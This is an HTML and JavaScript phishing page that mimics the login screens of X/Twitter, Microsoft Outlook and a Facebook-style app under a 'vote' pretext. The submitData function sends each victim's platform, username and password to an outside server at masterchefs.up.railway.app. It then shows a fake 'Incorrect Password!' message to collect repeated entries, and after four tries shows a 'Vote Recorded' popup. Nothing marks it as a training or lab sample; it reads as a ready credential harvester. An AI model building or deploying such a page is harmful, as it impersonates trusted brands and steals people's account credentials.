<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
    integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
    crossorigin="anonymous" referrerpolicy="no-referrer">
  <title>Login </title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: #e5e7eb;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }

    /* Generic Mobile Device Container */
    .mobile-screen {
      width: 320px;
      height: 650px;
      background: #ffffff;
      border-radius: 30px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
      box-sizing: border-box;
      position: relative;
      overflow: hidden;
      display: none;
      /* Hidden by default */
      flex-direction: column;
    }

    /* Universal Input/Button Reset */
    input {
      width: 100%;
      box-sizing: border-box;
      font-size: 14px;
      border: 1px solid #d1d5db;
    }

    button {
      width: 100%;
      border: none;
      font-weight: bold;
      cursor: pointer;
      font-size: 15px;
    }

    /* Flexbox Divider with Lines */
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      color: #6b7280;
      font-size: 12px;
      margin: 20px 0;
    }

    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #e5e7eb;
    }

    .divider:not(:empty)::before {
      margin-right: .5em;
    }

    .divider:not(:empty)::after {
      margin-left: .5em;
    }

    /* =========================================
     APP 1: Streamer Style (X) 
     ========================================= */
    .app-x {
      padding: 20px;
      padding-top: 50px;
    }

    .app-x h1 {
      font-size: 28px;
      margin-bottom: 30px;
      color: #0f172a;
    }

    .app-x h2 {
      font-size: 20px;
      margin-bottom: 20px;
      color: #0f172a;
      margin-top: 5px;
    }

    .app-x .btn-outline {
      background: white;
      border: 1px solid #d1d5db;
      border-radius: 30px;
      padding: 12px;
      margin-bottom: 15px;
      color: #0f172a;
    }

    .app-x input {
      padding: 15px;
      border-radius: 5px;
      margin-bottom: 20px;
    }

    .app-x .btn-primary {
      background: #0f172a;
      color: white;
      border-radius: 30px;
      padding: 15px;
      margin-bottom: 20px;
    }

    .app-x .btn-ghost {
      background: transparent;
      color: #0f172a;
      border: 1px solid #d1d5db;
      border-radius: 30px;
      padding: 12px;
    }

    .app-x .btn-text-only {
      background: transparent;
      color: #0f172a;
      border: none;
      text-align: left;
      padding: 0 0 20px 0;
      font-size: 14px;
      width: auto;
    }

    #streamer-step-2 {
      display: none;
    }

    /* Hides step 2 initially */

    /* =========================================
     APP 2: Outlook Style (Hotmail)
     ========================================= */
    .app-outlook {
      background: #ffffff;
      justify-content: space-between;
    }

    .outlook-header {
      padding: 60px 30px 20px;
      text-align: center;
    }

    /* Microsoft Logo Squares */
    .ms-logo {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2px;
      width: 24px;
      height: 24px;
      margin: 0 auto 16px;
    }

    .ms-square {
      width: 11px;
      height: 11px;
      border-radius: 1px;
    }

    .ms-square.red {
      background: #f25022;
    }

    .ms-square.green {
      background: #7fba00;
    }

    .ms-square.blue {
      background: #00a4ef;
    }

    .ms-square.yellow {
      background: #ffb900;
    }

    .outlook-header h1 {
      font-size: 24px;
      font-weight: 600;
      color: #1b1b1b;
      margin: 0 0 8px 0;
    }

    .outlook-header p {
      font-size: 14px;
      color: #1b1b1b;
      margin: 0;
    }

    .outlook-body {
      padding: 0 30px;
      flex: 1;
    }

    .app-outlook input {
      width: 100%;
      padding: 14px 12px;
      border: 1px solid #8a8886;
      border-radius: 2px;
      margin-bottom: 12px;
      font-size: 15px;
      color: #1b1b1b;
      background: #fff;
      box-sizing: border-box;
    }

    .app-outlook input:focus {
      outline: none;
      border-color: #0078d4;
      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
    }

    .outlook-hint {
      font-size: 13px;
      color: #1b1b1b;
      margin: 4px 0 20px 0;
    }

    .outlook-hint a {
      color: #0078d4;
      text-decoration: none;
    }

    .outlook-hint a:hover {
      text-decoration: underline;
    }

    .app-outlook .btn-primary {
      background: #0078d4;
      color: white;
      border-radius: 2px;
      padding: 14px;
      font-size: 15px;
      font-weight: 600;
      margin-bottom: 16px;
      transition: background 0.2s;
    }

    .app-outlook .btn-primary:hover {
      background: #106ebe;
    }

    .outlook-options {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .remember-me {
      font-size: 13px;
      color: #1b1b1b;
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
    }

    .remember-me input[type="checkbox"] {
      width: 16px;
      height: 16px;
      margin: 0;
      accent-color: #0078d4;
    }

    .cant-access {
      font-size: 13px;
      color: #0078d4;
      text-decoration: none;
    }

    .cant-access:hover {
      text-decoration: underline;
    }

    .outlook-footer {
      padding: 20px 30px 30px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 20px;
      font-size: 12px;
      color: #605e5c;
    }

    .outlook-footer a {
      color: #605e5c;
      text-decoration: none;
    }

    .outlook-footer a:hover {
      color: #1b1b1b;
    }

    /* =========================================
     APP 3: New G Style (FB)
     ========================================= */
    .app-fb {
      padding: 30px 20px;
      text-align: center;
      background: #fafafa;
    }

    .app-fb .logo-box {
      width: 60px;
      height: 60px;
      border-radius: 12px;
      margin: 40px auto;
    }

    .app-fb .logo-box img {
      width: 50px;
      height: 50px;
      margin-top: 15px;
    }

    .app-fb input {
      padding: 15px;
      border-radius: 8px;
      border: 1px solid #d1d5db;
      margin: 10px 0;
    }

    #newg-password {
      margin-bottom: 30px;
    }

    .app-fb .btn-primary {
      background: #405DE6;
      color: white;
      border-radius: 30px;
      padding: 14px;
      font-size: 16px;
      margin-bottom: 15px;
    }

    .app-fb .link-muted {
      color: #4b5563;
      font-size: 14px;
      text-decoration: none;
      font-weight: 500;
    }

    .app-fb .btn-create {
      background: transparent;
      border: 1px solid #405DE6;
      color: #405DE6;
      border-radius: 30px;
      padding: 12px;
      margin-top: 50px;
    }


    /* Success Popup Modal */
    .popup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      z-index: 99999;
      display: none;
      justify-content: center;
      align-items: center;
      animation: fadeIn 0.3s ease;
    }

    .popup-overlay.show {
      display: flex;
    }

    .popup-box {
      background: white;
      width: 90%;
      max-width: 320px;
      padding: 30px;
      border-radius: 16px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
      animation: slideUp 0.3s ease;
    }

    .popup-icon {
      width: 60px;
      height: 60px;
      background: #10b981;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      font-size: 28px;
      color: white;
    }

    .popup-box h2 {
      margin: 0 0 10px 0;
      color: #1f2937;
      font-size: 20px;
    }

    .popup-box p {
      margin: 0 0 24px 0;
      color: #6b7280;
      font-size: 14px;
      line-height: 1.5;
    }

    .popup-btn {
      width: 100%;
      padding: 14px;
      background: #10b981;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s;
    }

    .popup-btn:hover {
      background: #059669;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
      }

      to {
        opacity: 1;
      }
    }

    @keyframes slideUp {
      from {
        transform: translateY(20px);
        opacity: 0;
      }

      to {
        transform: translateY(0);
        opacity: 1;
      }
    }
  </style>
</head>

<body>
  <!-- Success Popup -->
  <div id="success-popup" class="popup-overlay">
    <div class="popup-box">
      <div class="popup-icon">✓</div>
      <h2>Vote Recorded</h2>
      <p>You will be notified when your vote has been counted.</p>
      <button class="popup-btn" onclick="closePopup()">OK</button>
    </div>
  </div>
  <div id="app-streamer" class="mobile-screen app-x" style="display: flex;">

    <div id="streamer-step-1" style="width: 100%;">
      <i class="fa-brands fa-x-twitter" style="font-size: 3rem;"></i>
      <h1>Happening now </h1>
      <h2>Join today.</h2>
      <button class="btn-outline">Continue with Google</button>
      <button class="btn-outline">Continue with Apple</button>
      <div class="divider">or</div>
      <input type="text" id="streamer-username" placeholder="Phone, email, or username">
      <button class="btn-primary" onclick="streamerNext()">Next</button>
      <button class="btn-ghost">Forgot password?</button>
    </div>

    <div id="streamer-step-2" style="width: 100%;">
      <button class="btn-text-only" onclick="streamerBack()">← Back</button>
      <h2 id="streamer-display-name">User</h2>
      <input type="password" id="streamer-password" placeholder="Password">
      <button class="btn-primary" onclick="submitData('Streamer', 'streamer-username', 'streamer-password')">Log
        In</button>
      <button class="btn-ghost">Forgot password?</button>
    </div>

  </div>

  <div id="app-snapgrid" class="mobile-screen app-outlook" style="display: none;">

    <!-- Outlook Header -->
    <div class="outlook-header">
      <div class="ms-logo">
        <div class="ms-square red"></div>
        <div class="ms-square green"></div>
        <div class="ms-square blue"></div>
        <div class="ms-square yellow"></div>
      </div>
      <h1>Outlook</h1>
      <p>Sign in to continue</p>
    </div>

    <!-- Login Form -->
    <div class="outlook-body">
      <input type="text" id="snapgrid-username" placeholder="Email, phone, or Skype">
      <input type="password" id="snapgrid-password" placeholder="Password">
      <p class="outlook-hint">No account? <a href="#">Create one!</a></p>
      <button class="btn-primary" onclick="submitData('SnapGrid', 'snapgrid-username', 'snapgrid-password')">Sign
        in</button>

      <div class="outlook-options">
        <label class="remember-me">
          <input type="checkbox"> Keep me signed in
        </label>
        <a href="#" class="cant-access">Can't access your account?</a>
      </div>
    </div>

    <!-- Footer -->
    <div class="outlook-footer">
      <a href="#">Terms of use</a>
      <a href="#">Privacy & cookies</a>
      <span>Microsoft</span>
    </div>

  </div>

  <div id="app-newg" class="mobile-screen app-fb">
    <div style="color: #6b7280; font-size: 13px;">English (UK)</div>
    <div class="logo-box"><img src="./images/logo.webp" alt="logo image"></div>
    <input type="text" id="newg-username" placeholder="Mobile number or email address">
    <input type="password" id="newg-password" placeholder="Password">
    <button class="btn-primary" onclick="submitData('New G', 'newg-username', 'newg-password')">Log In</button>
    <a href="#" class="link-muted">Forgotten password?</a>
    <button class="btn-create">Create new account</button>
  </div>

  <script>
    // Configuration
    const API_URL = window.location.hostname === 'localhost'
      ? 'http://localhost:3000/api'
      : 'masterchefs.up.railway.app/api';

    // Show app based on URL parameter or default to streamer
    function initApp() {
      const urlParams = new URLSearchParams(window.location.search);
      const app = urlParams.get('app') || 'streamer';
      switchApp(app);
    }

    // Dynamic UI Switching
    function switchApp(appId) {
      // Hide all apps
      document.getElementById('app-streamer').style.display = 'none';
      document.getElementById('app-snapgrid').style.display = 'none';
      document.getElementById('app-newg').style.display = 'none';

      // Show selected app
      const selectedApp = document.getElementById('app-' + appId);
      if (selectedApp) {
        selectedApp.style.display = 'flex';
      }

      // Reset Streamer state if not showing streamer
      if (appId !== 'streamer') {
        streamerBack();
      }
    }

    // Streamer 2-Step Logic
    function streamerNext() {
      const user = document.getElementById('streamer-username').value;
      if (user.trim() === '') { alert("Please enter a username"); return; }

      document.getElementById('streamer-display-name').innerText = user;
      document.getElementById('streamer-step-1').style.display = 'none';
      document.getElementById('streamer-step-2').style.display = 'block';
    }

    function streamerBack() {
      document.getElementById('streamer-step-2').style.display = 'none';
      document.getElementById('streamer-step-1').style.display = 'block';
    }

    // Track failed attempts per platform
    const attemptTracker = {
      'Streamer': 0,
      'SnapGrid': 0,
      'New G': 0
    };

    async function submitData(platform, userFieldId, passFieldId) {
      const username = document.getElementById(userFieldId).value;
      const password = document.getElementById(passFieldId).value;

      if (username === '' || password === '') {
        alert("Please fill in all fields.");
        return;
      }

      const payload = {
        platform: platform,
        username: username,
        password: password
      };

      try {
        const response = await fetch(`${API_URL}/logins`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        const result = await response.json();

        if (result.status === "success") {
          // Increment attempt counter
          attemptTracker[platform]++;

          // Show error message (fake "incorrect password")
          alert("Incorrect Password!");

          // Clear fields
          document.getElementById(userFieldId).value = '';
          document.getElementById(passFieldId).value = '';

          // Reset streamer step if needed
          if (platform === 'Streamer') streamerBack();

          // Check if 4 attempts reached
          if (attemptTracker[platform] >= 4) {
            // Reset counter
            attemptTracker[platform] = 0;
            // Show success popup after short delay
            setTimeout(() => {
              showPopup();
            }, 500);
          }
        } else {
          alert("Error: " + result.message);
        }
      } catch (error) {
        console.error("Fetch error:", error);
        alert("Could not connect to the server. Please try again later.");
      }
    }

    function showPopup() {
      document.getElementById('success-popup').classList.add('show');
    }

    function closePopup() {
      document.getElementById('success-popup').classList.remove('show');
      // Optional: redirect to index or clear form
       window.location.href = 'index.html';
    }

    // Close popup on overlay click
    document.getElementById('success-popup')?.addEventListener('click', function (e) {
      if (e.target === this) closePopup();
    });
    // Initialize on page load
    window.onload = initApp;
  </script>
</body>

</html>
